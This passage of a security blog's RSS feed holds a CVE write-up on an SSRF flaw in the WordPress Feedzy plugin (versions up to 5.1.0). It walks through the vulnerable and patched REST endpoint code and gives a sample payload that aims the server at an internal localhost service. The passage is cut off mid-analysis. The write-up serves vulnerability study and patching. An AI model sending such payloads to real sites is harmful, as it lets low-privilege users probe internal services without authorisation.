0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/zoloblocks/vulnerability/wordpress-zoloblocks-plugin-2-3-9-server-side-request-forgery-ssrf-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress ZoloBlocks Plugin &amp;lt;= 2.3.11 is vulnerable to Server Side Request Forgery (SSRF) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-11128 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-30-cve-2025-11128/</link>
      <pubDate>Thu, 30 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-30-cve-2025-11128/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-30-cve-2025-11128/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The Feedzy RSS Aggregator plugin – Feed to Post, Autoblogging, News &amp;amp; YouTube Video Feeds Aggregator for WordPress has a &lt;strong&gt;Server-Side Request Forgery&lt;/strong&gt; vulnerability in all versions up to and including &lt;code&gt;5.1.0&lt;/code&gt; via the function &lt;code&gt;&#39;feedzy_sanitize_feeds&#39;&lt;/code&gt;. This allows an authenticated attacker with &lt;strong&gt;Subscriber&lt;/strong&gt; level access or higher to perform web requests to arbitrary addresses originating from the web application and can be used to query information from internal services.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11128&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11128&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.1.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.1.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/feedzy-rss-feeds/advanced/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Feedzy Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Feedzy&lt;/strong&gt;: &lt;strong&gt;5.1.0&lt;/strong&gt; (vulnerable) and &lt;strong&gt;5.1.1&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff/comparison tool to inspect and compare differences between the two versions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Feedzy RSS Aggregator&lt;/strong&gt; plugin registers a REST API endpoint at &lt;code&gt;/feedzy/v1/feed/&lt;/code&gt; which allows users to submit a URL to fetch feed data.&#xA;However, in &lt;strong&gt;version 5.1.0&lt;/strong&gt;, this endpoint is weakly protected and the URL filtering mechanism is unsafe, leading to a &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt; vulnerability.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function feedzy_register_rest_route() {&#xA;    register_rest_route(&#xA;        &amp;#39;feedzy/v1&amp;#39;,&#xA;        &amp;#39;/feed/&amp;#39;,&#xA;        array(&#xA;            &amp;#39;methods&amp;#39;             =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;            &amp;#39;callback&amp;#39;            =&amp;gt; array( $this, &amp;#39;feedzy_rest_route&amp;#39; ),&#xA;            &amp;#39;permission_callback&amp;#39; =&amp;gt; function () {&#xA;                return is_user_logged_in();&#xA;            },&#xA;            &amp;#39;args&amp;#39;                =&amp;gt; array(&#xA;                &amp;#39;url&amp;#39;      =&amp;gt; array(&#xA;                    &amp;#39;sanitize_callback&amp;#39; =&amp;gt; array( $this, &amp;#39;feedzy_sanitize_feeds&amp;#39; ),&#xA;                ),&#xA;                &amp;#39;category&amp;#39; =&amp;gt; array(&#xA;                    &amp;#39;sanitize_callback&amp;#39; =&amp;gt; array( $this, &amp;#39;feedzy_sanitize_categories&amp;#39; ),&#xA;                ),&#xA;            ),&#xA;        )&#xA;    );&#xA;}&#xA;&#xA;public function feedzy_sanitize_feeds( $input ) {&#xA;    if ( count( $input ) === 1 ) {&#xA;        $feed = esc_url( $input[0] );&#xA;        return $feed;&#xA;    } else {&#xA;        $feeds = array();&#xA;        foreach ( $input as $item ) {&#xA;            $feeds[] = esc_url( $item );&#xA;        }&#xA;        return $feeds;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the vulnerable version:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;The endpoint only checks &lt;code&gt;is_user_logged_in()&lt;/code&gt;, meaning any logged-in account (including Subscriber) can send requests.&lt;/li&gt;&#xA;&lt;li&gt;The function &lt;code&gt;feedzy_sanitize_feeds()&lt;/code&gt; only uses &lt;code&gt;esc_url()&lt;/code&gt; — this function sanitizes a URL string for display, but does not validate correctness or restrict access to internal addresses.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition bug open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;Therefore, an attacker can send the payload &lt;code&gt;url=http://localhost:8001/admin&lt;/code&gt; to coerce the server to send a request to an internal service → SSRF.&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function feedzy_register_rest_route() {&#xA;    register_rest_route(&#xA;        &amp;#39;feedzy/v1&amp;#39;,&#xA;        &amp;#39;/feed/&amp;#39;,&#xA;        array(&#xA;            &amp;#39;methods&amp;#39;             =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;            &amp;#39;callback&amp;#39;            =&amp;gt; array( $this, &amp;#39;feedzy_rest_route&amp;#39; ),&#xA;            &amp;#39;permission_callback&amp;#39; =&amp;gt; function ( WP_REST_Request $request ) {&#xA;                $post_id = absint( $request-&amp;gt;get_param( &amp;#39;postId&amp;#39; ) );&#xA;                return current_user_can( &amp;#39;edit_post&amp;#39;, $post_id );&#xA;            },&#xA;            &amp;#39;args&amp;#39;                =&amp;gt; array(&#xA;                &amp;#39;url&amp;#39;      =&amp;gt; array(&#xA;                    &amp;#39;sanitize_callback&amp;#39; =&amp;gt; array( $this, &amp;#39;feedzy_sanitize_feeds&amp;#39; ),&#xA;                ),&#xA;                &amp;#39;category&amp;#39; =&amp;gt; array(&#xA;                    &amp;#39;sanitize_callback&amp;#39; =&amp;gt; array( $this, &amp;#39;feedzy_sanitize_categories&amp;#39; ),&#xA;                ),&#xA;            ),&#xA;        )&#xA;    );&#xA;}&#xA;&#xA;public function feedzy_sanitize_feeds( $input ) {&#xA;    if ( count( $input ) === 1 ) {&#xA;        $feed = wp_http_validate_url( $input[0] );&#xA;        return $feed;&#xA;    } else {&#xA;        $feeds = array();&#xA;        foreach ( $input as $item ) {&#xA;            if ( wp_http_validate_url( $item ) ) {&#xA;                $feeds[] = esc_url_raw( $item );&#xA;            }&#xA;        }&#xA;        return $feeds;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Restricts REST API access using &lt;code&gt;current_user_can( &#39;edit_post&#39;, $post_id )&lt;/code&gt;, allowing only &lt;strong&gt;Editors&lt;/strong&gt; or &lt;strong&gt;Admins&lt;/strong&gt; with the capability to call the endpoint.&lt;/li&gt;&#xA;&lt;li&gt;Replaces &lt;code&gt;esc_url()&lt;/code&gt; with &lt;code&gt;wp_http_validate_url()&lt;/code&gt;, ensuring the URL is valid, only accepts &lt;strong&gt;http&lt;/strong&gt;/&lt;strong&gt;https&lt;/strong&gt; protocols, and excludes internal addresses (&lt;code&gt;loopback&lt;/code&gt;, &lt;code&gt;localhost&lt;/code&gt;, &lt;code&gt;127.0.0.1...&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;Uses &lt;code&gt;esc_url_raw()&lt;/code&gt; to safely store the URL without re-encoding for display.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition info open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;The &lt;code&gt;count()&lt;/code&gt; in &lt;code&gt;feedzy_sanitize_feeds()&lt;/code&gt; requires the input parameter to be &lt;strong&gt;Countable&lt;/strong&gt; or an &lt;strong&gt;array&lt;/strong&gt;. If a &lt;strong&gt;string&lt;/strong&gt; is passed, PHP will throw an error:&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;strong&gt;Exception has occurred.&lt;/strong&gt;&#xA;TypeError: count(): Argument #1 ($value) must be of type Countable|array, string given&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;Therefore, when sending a request to the endpoint, the &lt;code&gt;url&lt;/code&gt; parameter must be passed as an &lt;strong&gt;array&lt;/strong&gt;, for example:&#xA;&lt;code&gt;url[0]=&amp;quot;http://example.com&amp;quot;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;feedzy_rest_route()&lt;/code&gt; is registered as the callback for the API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function feedzy_rest_route( $data ) {&#xA;    $feed = $data;&#xA;    if ( isset( $data[&amp;#39;feeds&amp;#39;] ) ) {&#xA;        $feed_category = $this-&amp;gt;feedzy_sanitize_categories( $data[&amp;#39;feeds&amp;#39;] );&#xA;        if ( $feed_category ) {&#xA;            $data[&amp;#39;url&amp;#39;] = $feed_category;&#xA;        }&#xA;    }&#xA;    if ( ! empty( $data[&amp;#39;url&amp;#39;] ) ) {&#xA;        $feed = $data[&amp;#39;url&amp;#39;];&#xA;    } elseif ( ! empty( $data[&amp;#39;category&amp;#39;] ) ) {&#xA;        $feed = $data[&amp;#39;category&amp;#39;];&#xA;    }&#xA;&#xA;    $url = &amp;#39;&amp;#39;;&#xA;    if ( ! $feed instanceof \WP_REST_Request ) {&#xA;        $url = $feed;&#xA;    }&#xA;&#xA;    $meta_args = array(&#xA;        &amp;#39;date_format&amp;#39; =&amp;gt; get_option( &amp;#39;date_format&amp;#39; ),&#xA;        &amp;#39;time_format&amp;#39; =&amp;gt; get_option( &amp;#39;time_format&amp;#39; ),&#xA;    );&#xA;&#xA;    $instance = Feedzy_Rss_Feeds::instance();&#xA;    $admin    = $instance-&amp;gt;get_admin();&#xA;    $feed     = $admin-&amp;gt;fetch_feed( $url, &amp;#39;12_hours&amp;#39;, array( &amp;#39;&amp;#39; ) );&#xA;    $feedy    = array();&#xA;&#xA;    if ( ! $feed-&amp;gt;init() ) {&#xA;        $feedy[&amp;#39;error&amp;#39;] = __( &amp;#39;Invalid Feed URL&amp;#39;, &amp;#39;feedzy-rss-feeds&amp;#39; );&#xA;        header( &amp;#39;Content-Type: application/json; charset=&amp;#39; . get_option( &amp;#39;blog_charset&amp;#39; ) );&#xA;        return $feedy;&#xA;    }&#xA;&#xA;    if ( ( ! $feed-&amp;gt;get_title() ) &amp;amp;&amp;amp; ( ! $feed-&amp;gt;get_title() ) &amp;amp;&amp;amp; ( ! $feed-&amp;gt;get_title() ) ) {&#xA;        $feedy[&amp;#39;channel&amp;#39;] = null;&#xA;    } else {&#xA;        $feedy[&amp;#39;channel&amp;#39;] = array(&#xA;            &amp;#39;title&amp;#39;       =&amp;gt; ( ( $feed-&amp;gt;get_title() ) ? $feed-&amp;gt;get_title() : null ),&#xA;            &amp;#39;description&amp;#39; =&amp;gt; ( ( $feed-&amp;gt;get_description() ) ? $feed-&amp;gt;get_description() : null ),&#xA;            &amp;#39;permalink&amp;#39;   =&amp;gt; ( ( $feed-&amp;gt;get_permalink() ) ? $feed-&amp;gt;get_permalink() : null ),&#xA;        );&#xA;    }&#xA;&#xA;    $feedy[&amp;#39;items&amp;#39;] = array();&#xA;    $items          = $feed-&amp;gt;get_items();&#xA;    $is_multiple    = ! empty( $feed-&amp;gt;multifeed_url ) &amp;amp;&amp;amp; is_array( $feed-&amp;gt;multifeed_url );&#xA;    foreach ( $items as $item ) {&#xA;        $item_attrs = apply_filters( &amp;#39;feedzy_item_filter&amp;#39;, array(), $item );&#xA;&#xA;        array_push(&#xA;            $feedy[&amp;#39;items&amp;#39;],&#xA;            array(&#xA;                &amp;#39;title&amp;#39;       =&amp;gt; ( ( $item-&amp;gt;get_title() ) ? $item-&amp;gt;get_title() : null ),&#xA;                &amp;#39;link&amp;#39;        =&amp;gt; ( ( $item-&amp;gt;get_permalink() ) ? $item-&amp;gt;get_permalink() : null ),&#xA;                &amp;#39;creator&amp;#39;     =&amp;gt; ( ( $item-&amp;gt;get_author() ) ? $item-&amp;gt;get_author()-&amp;gt;get_name() : null ),&#xA;                &amp;#39;source&amp;#39;      =&amp;gt; $is_multiple &amp;amp;&amp;amp; $item-&amp;gt;get_feed()-&amp;gt;get_title() ? $item-&amp;gt;get_feed()-&amp;gt;get_title() : &amp;#39;&amp;#39;,&#xA;                &amp;#39;pubDate&amp;#39;     =&amp;gt; ( ( $item-&amp;gt;get_date() ) ? $item-&amp;gt;get_date( &amp;#39;U&amp;#39; ) : null ),&#xA;                &amp;#39;date&amp;#39;        =&amp;gt; ( ( $item-&amp;gt;get_date() ) ? date_i18n( $meta_args[&amp;#39;date_format&amp;#39;], $item-&amp;gt;get_date( &amp;#39;U&amp;#39; ) ) : null ),&#xA;                &amp;#39;time&amp;#39;        =&amp;gt; ( ( $item-&amp;gt;get_date() ) ? date_i18n( $meta_args[&amp;#39;time_format&amp;#39;], $item-&amp;gt;get_date( &amp;#39;U&amp;#39; ) ) : null ),&#xA;                &amp;#39;description&amp;#39; =&amp;gt; isset( $item_attrs[&amp;#39;item_description&amp;#39;] ) ? $item_attrs[&amp;#39;item_description&amp;#39;] : ( $item-&amp;gt;get_description() ? $item-&amp;gt;get_description() : null ),&#xA;                &amp;#39;thumbnail&amp;#39;   =&amp;gt; $admin-&amp;gt;feedzy_retrieve_image( $item ),&#xA;                &amp;#39;default_img&amp;#39; =&amp;gt; apply_filters( &amp;#39;feedzy_default_image&amp;#39;, &amp;#39;&amp;#39;, $url ),&#xA;                &amp;#39;price&amp;#39;       =&amp;gt; isset( $item_attrs[&amp;#39;item_price&amp;#39;] ) ? $item_attrs[&amp;#39;item_price&amp;#39;] : null,&#xA;                &amp;#39;media&amp;#39;       =&amp;gt; isset( $item_attrs[&amp;#39;item_media&amp;#39;] ) ? $item_attrs[&amp;#39;item_media&amp;#39;] : null,&#xA;                &amp;#39;categories&amp;#39;  =&amp;gt; isset( $item_attrs[&amp;#39;item_categories&amp;#39;] ) ? $item_attrs[&amp;#39;item_categories&amp;#39;] : null,&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    header( &amp;#39;Content-Type: application/json; charset=&amp;#39; . get_option( &amp;#39;blog_charset&amp;#39; ) );&#xA;    $output = $feedy;&#xA;    return $output;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Logic of the function:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Receive and process input data&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$feed = $data;&#xA;if ( isset( $data[&amp;#39;feeds&amp;#39;] ) ) {&#xA;    $feed_category = $this-&amp;gt;feedzy_sanitize_categories( $data[&amp;#39;feeds&amp;#39;] );&#xA;    if ( $feed_category ) {&#xA;        $data[&amp;#39;url&amp;#39;] = $feed_category;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;The function checks if the request contains the &lt;code&gt;feeds&lt;/code&gt; parameter; it is &lt;strong&gt;sanitized&lt;/strong&gt; via &lt;code&gt;feedzy_sanitize_categories()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;If valid, the result is assigned back to &lt;code&gt;$data[&#39;url&#39;]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Choose the data source &lt;code&gt;$feed&lt;/code&gt; with priority&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! empty( $data[&amp;#39;url&amp;#39;] ) ) {&#xA;    $feed = $data[&amp;#39;url&amp;#39;];&#xA;} elseif ( ! empty( $data[&amp;#39;category&amp;#39;] ) ) {&#xA;    $feed = $data[&amp;#39;category&amp;#39;];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;If &lt;code&gt;url&lt;/code&gt; exists → use it as the main source.&lt;/li&gt;&#xA;&lt;li&gt;If not → use &lt;code&gt;category&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;→ This is where user input (&lt;code&gt;url&lt;/code&gt;) is forwarded to the feed fetching process.&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Prepare variable &lt;code&gt;$url&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$url = &amp;#39;&amp;#39;;&#xA;if ( ! $feed instanceof \WP_REST_Request ) {&#xA;    $url = $feed;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;If &lt;code&gt;$feed&lt;/code&gt; &lt;strong&gt;is not an instance of WP_REST_Request&lt;/strong&gt;, it is assigned to &lt;code&gt;$url&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;In practice &lt;code&gt;$feed&lt;/code&gt; is usually &lt;strong&gt;a URL string or an array of URLs&lt;/strong&gt; taken from the request.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Call core processing function&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$instance = Feedzy_Rss_Feeds::instance();&#xA;$admin    = $instance-&amp;gt;get_admin();&#xA;$feed     = $admin-&amp;gt;fetch_feed( $url, &amp;#39;12_hours&amp;#39;, array( &amp;#39;&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Calls &lt;code&gt;Feedzy_Rss_Feeds::instance()&lt;/code&gt; to get the main plugin instance.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Uses &lt;code&gt;$admin-&amp;gt;fetch_feed()&lt;/code&gt; to &lt;strong&gt;load the feed from the URL&lt;/strong&gt; (with a 12-hour cache).&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;⚠️ This is where SSRF can occur if &lt;code&gt;$url&lt;/code&gt; comes from uncontrolled input.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol 